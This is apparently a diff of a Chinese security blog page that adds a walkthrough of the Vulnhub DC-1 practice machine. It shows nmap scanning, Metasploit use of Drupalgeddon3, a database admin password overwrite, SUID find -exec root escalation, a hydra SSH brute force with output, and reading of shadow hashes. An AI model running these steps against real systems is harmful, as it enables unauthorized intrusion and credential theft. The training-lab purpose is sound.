@@ -127,6 +127,110 @@
   
     
       <article
+id="post-DC-1靶场"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2022/12/05/DC-1%E9%9D%B6%E5%9C%BA/">DC-1</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <p>靶场地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1-1,292/">https://www.vulnhub.com/entry/dc-1-1,292/</a></p>
+<p>发现主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.88.0/24 </span><br></pre></td></tr></table></figure>
+
+<p>查看端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.88.136  发现开启了80端口</span><br></pre></td></tr></table></figure>
+
+<p>使用Wappalyzer插件发现CMS为drupal</p>
+<p>搜索kali自带的<a target="_blank" rel="noopener" href="https://www.exploit-db.com/%E5%8F%91%E7%8E%B0%E5%8F%AF%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%EF%BC%9ADrupal">https://www.exploit-db.com/发现可进行漏洞检测：Drupal</a> &lt; 7.58 - ‘Drupalgeddon3’ (Authenticated) Remote Code (Metasploit)</p>
+<p>使用msf攻击成功，得到flag1 ，为了完整的shell交互可使用以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>flag1：Every good CMS needs a config file - and so do you.</p>
+<hr>
+<p>得到config的提示，百度得知drupal默认配置文件：*&#x2F;sites&#x2F;default&#x2F;settings.php*</p>
+<p>flag2：Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access). What can you do with these credentials?</p>
+<p>看来从配置文件直接拿到了数据库账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">’</span><br></pre></td></tr></table></figure>
+
+<p>登陆数据库发现后台的登录账号密码 其中密码是加密过的</p>
+<p>admin | $S$DifAHlulp74nq&#x2F;0qgqyEZC3myrg2.BKIhElw6&#x2F;N&#x2F;dRHCXN&#x2F;aHTnu </p>
+<p>思路是修改密码直接登录，用drupal自带的&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh加密12345</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www/scripts$ php password-hash.sh 12345 </span><br><span class="line">php password-hash.sh 12345</span><br><span class="line"></span><br><span class="line">password: 12345                 hash: $S$DYcuHU5yVhSkEP9Yuya/ODVNJkO4DpbPtvMKqUGM8Zps7DsgPhne</span><br></pre></td></tr></table></figure>
+
+<p>到数据库修改密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update set pass=&quot;$S$DYcuHU5yVhSkEP9Yuya/ODVNJkO4DpbPtvMKqUGM8Zps7DsgPhne&quot; where name=&quot;admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>登录后台得到flag3：Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+<hr>
+<p>查看&#x2F;etc&#x2F;hadow 发现没有权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/$ cat /etc/shadow</span><br><span class="line">cat /etc/shadow</span><br><span class="line">cat: /etc/shadow: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>提权：find -name 文件名 -exec &#x2F;bin&#x2F;sh \；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:/var/www$ find -name flag1.txt -exec /bin/sh \;</span><br><span class="line">find -name flag1.txt -exec /bin/sh \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY&#x2F;eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</p>
+<hr>
+<p>方法一 直接进家目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># cd ~flag4</span><br><span class="line">cd ~flag4</span><br><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"># cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<p>方法二 hydra爆破 之前发现开放了22端口</p>
+<p>kali自带的字典文件 路径：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.88.136</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-05 07:14:53</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.88.136:22/</span><br><span class="line">[22][ssh] host: 192.168.88.136   login: flag4   password: orange</span><br><span class="line">[STATUS] attack finished for 192.168.88.136 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-05 07:16:05</span><br><span class="line">          </span><br></pre></td></tr></table></figure>
+
+<p>连接ssh服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.88.136</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;192.168.88.136 (192.168.88.136)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:89B+YqcNl4cSf/BZk26MQG1QeW4BvBlVENMbTRhVhsU.</span><br><span class="line">This key is not known by any other names</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.88.136&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">flag4@192.168.88.136&#x27;s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:/$ ls</span><br><span class="line">bin   home            lib64       opt   sbin     tmp      vmlinuz.old</span><br><span class="line">boot  initrd.img      lost+found  proc  selinux  usr</span><br><span class="line">dev   initrd.img.old  media       root  srv      var</span><br><span class="line">etc   lib             mnt         run   sys      vmlinuz</span><br><span class="line">flag4@DC-1:/$ cd ./root</span><br><span class="line">-bash: cd: ./root: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>需要提权得到最终的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"># cat thefinalflag.txt</span><br><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
+
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2022-12-05T13:06:25.000Z" itemprop="datePublished">2022-12-05</time>
+</div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">Vulnhub靶场</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
 id="post-CVE-2021-21972漏洞复现"
 class="article article-type-post"
 >
@@ -298,7 +402,7 @@ class="article article-type-post"
   <div class="widget-wrap widget-tags">
     <div class="widget-title"><span>Tags</span></div>
     <div class="widget-inner">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">Vulnhub靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
     </div>
   </div>
 
@@ -309,6 +413,10 @@ class="article article-type-post"
     <div class="widget-title"><span>Recent Posts</span></div>
     <div class="widget-inner">
       <ul>
+        
+          <li>
+            <a href="/2022/12/05/DC-1%E9%9D%B6%E5%9C%BA/">DC-1</a>
+          </li>
         
           <li>
             <a href="/2022/12/02/CVE-2021-21972%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2021-21972漏洞复现</a>
